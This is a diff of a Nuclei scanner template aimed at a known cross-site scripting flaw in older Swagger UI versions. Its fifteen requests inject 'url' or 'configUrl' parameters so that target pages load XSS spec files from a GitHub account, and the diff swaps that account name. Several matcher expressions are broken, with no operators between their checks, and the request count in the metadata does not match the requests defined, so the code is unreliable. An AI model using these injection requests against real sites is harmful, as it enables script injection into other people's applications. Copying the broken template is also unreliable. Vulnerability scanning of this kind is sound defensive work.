@@ -5,102 +5,102 @@ info:
   author: MrL872
   severity: medium
   description: Swagger UI versions affected from 3.14.1 to, but not including 3.38.0 . Fixed in 2021.
-   
+
   reference:
     - https://github.com/MrL872/nuclei-template-for-swagger-ui-xss
   metadata:
     max-request: 14
   tags: xss,swagger-ui,metascan-private
-  
+
 requests:
    r0:
       request:
         method: GET
-        path: "{{RootURL}}/swagger-ui.html?configUrl=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/config.json"
+        path: "{{RootURL}}/swagger-ui.html?configUrl=https://raw.githubusercontent.com/MrL872/nuclei-templates/main/swagger-ui-xss/config.json"
       expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css")  response.body.bcontains(b"swagger-ui.css")  response.body.bcontains(b"swagger-ui-")
       stop_if_match: true
    r1:
       request:
         method: GET
-        path: "{{RootURL}}/swagger-ui.html?url=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/xss-domain.yaml"
+        path: "{{RootURL}}/swagger-ui.html?url=https://raw.githubusercontent.com/MrL872/nuclei-templates/main/swagger-ui-xss/xss-domain.yaml"
       expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css")  response.body.bcontains(b"swagger-ui.css")  response.body.bcontains(b"swagger-ui-")
       stop_if_match: true
    r2:
       request:
         method: GET
-        path: "{{RootURL}}/swagger-ui.html?url=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/xss-fetch.yaml"
+        path: "{{RootURL}}/swagger-ui.html?url=https://raw.githubusercontent.com/MrL872/nuclei-templates/main/swagger-ui-xss/xss-fetch.yaml"
       expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css")  response.body.bcontains(b"swagger-ui.css")  response.body.bcontains(b"swagger-ui-")
       stop_if_match: true
    r3:
       request:
         method: GET
-        path: "{{RootURL}}/index.html?configUrl=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/config.json"
+        path: "{{RootURL}}/index.html?configUrl=https://raw.githubusercontent.com/MrL872/nuclei-templates/main/swagger-ui-xss/config.json"
       expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css")  response.body.bcontains(b"swagger-ui.css")  response.body.bcontains(b"swagger-ui-")
       stop_if_match: true
    r4:
       request:
         method: GET
-        path: "{{RootURL}}/index.html?url=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/xss-domain.yaml"
+        path: "{{RootURL}}/index.html?url=https://raw.githubusercontent.com/MrL872/nuclei-templates/main/swagger-ui-xss/xss-domain.yaml"
       expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css")  response.body.bcontains(b"swagger-ui.css")  response.body.bcontains(b"swagger-ui-")
       stop_if_match: true
    r5:
       request:
         method: GET
-        path: "{{RootURL}}/index.html?url=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/xss-fetch.yaml"
+        path: "{{RootURL}}/index.html?url=https://raw.githubusercontent.com/MrL872/nuclei-templates/main/swagger-ui-xss/xss-fetch.yaml"
       expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css")  response.body.bcontains(b"swagger-ui.css")  response.body.bcontains(b"swagger-ui-")
       stop_if_match: true
    r6:
       request:
         method: GET
-        path: "{{RootURL}}/swagger/index.html?url=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/xss-domain.yaml"
+        path: "{{RootURL}}/swagger/index.html?url=https://raw.githubusercontent.com/MrL872/nuclei-templates/main/swagger-ui-xss/xss-domain.yaml"
       expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css")  response.body.bcontains(b"swagger-ui.css")  response.body.bcontains(b"swagger-ui-")
       stop_if_match: true
    r7:
       request:
         method: GET
-        path: "{{RootURL}}/swagger/index.html?url=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/xss-fetch.yaml"
+        path: "{{RootURL}}/swagger/index.html?url=https://raw.githubusercontent.com/MrL872/nuclei-templates/main/swagger-ui-xss/xss-fetch.yaml"
       expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css")  response.body.bcontains(b"swagger-ui.css")  response.body.bcontains(b"swagger-ui-")
       stop_if_match: true
    r8:
       request:
         method: GET
-        path: "{{RootURL}}/swagger/index.html?configUrl=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/config.json"
+        path: "{{RootURL}}/swagger/index.html?configUrl=https://raw.githubusercontent.com/MrL872/nuclei-templates/main/swagger-ui-xss/config.json"
       expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css")  response.body.bcontains(b"swagger-ui.css")  response.body.bcontains(b"swagger-ui-")
       stop_if_match: true
    r9:
       request:
         method: GET
-        path: "{{RootURL}}/swagger-ui/index.html?url=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/xss-fetch.yaml"
+        path: "{{RootURL}}/swagger-ui/index.html?url=https://raw.githubusercontent.com/MrL872/nuclei-templates/main/swagger-ui-xss/xss-fetch.yaml"
       expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css")  response.body.bcontains(b"swagger-ui.css")  response.body.bcontains(b"swagger-ui-")
       stop_if_match: true
    r10:
       request:
         method: GET
-        path: "{{RootURL}}/swagger-ui/index.html?url=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/xss-domain.yaml"
+        path: "{{RootURL}}/swagger-ui/index.html?url=https://raw.githubusercontent.com/MrL872/nuclei-templates/main/swagger-ui-xss/xss-domain.yaml"
       expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css")  response.body.bcontains(b"swagger-ui.css")  response.body.bcontains(b"swagger-ui-")
       stop_if_match: true
    r11:
       request:
         method: GET
-        path: "{{RootURL}}/swagger-ui/index.html?configUrl=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/config.json"
+        path: "{{RootURL}}/swagger-ui/index.html?configUrl=https://raw.githubusercontent.com/MrL872/nuclei-templates/main/swagger-ui-xss/config.json"
       expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css")  response.body.bcontains(b"swagger-ui.css")  response.body.bcontains(b"swagger-ui-")
       stop_if_match: true
    r12:
       request:
         method: GET
-        path: "{{RootURL}}/docs?url=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/xss-fetch.yaml"
+        path: "{{RootURL}}/docs?url=https://raw.githubusercontent.com/MrL872/nuclei-templates/main/swagger-ui-xss/xss-fetch.yaml"
       expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css")  response.body.bcontains(b"swagger-ui.css")  response.body.bcontains(b"swagger-ui-")
       stop_if_match: true
    r13:
       request:
         method: GET
-        path: "{{RootURL}}/docs?url=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/xss-domain.yaml"
+        path: "{{RootURL}}/docs?url=https://raw.githubusercontent.com/MrL872/nuclei-templates/main/swagger-ui-xss/xss-domain.yaml"
       expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css")  response.body.bcontains(b"swagger-ui.css")  response.body.bcontains(b"swagger-ui-")
       stop_if_match: true
    r14:
       request:
         method: GET
-        path: "{{RootURL}}/docs?configUrl=https://raw.githubusercontent.com/vulnspace/nuclei-templates/main/swagger-ui-xss/config.json"
+        path: "{{RootURL}}/docs?configUrl=https://raw.githubusercontent.com/MrL872/nuclei-templates/main/swagger-ui-xss/config.json"
       expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css")  response.body.bcontains(b"swagger-ui.css")  response.body.bcontains(b"swagger-ui-")
      stop_if_match: true
 expression: r0() || r1() || r2() || r3() || r4() || r5() || r6() || r7() || r8() || r9() || r10() || r11() || r12() || r13() || r14()
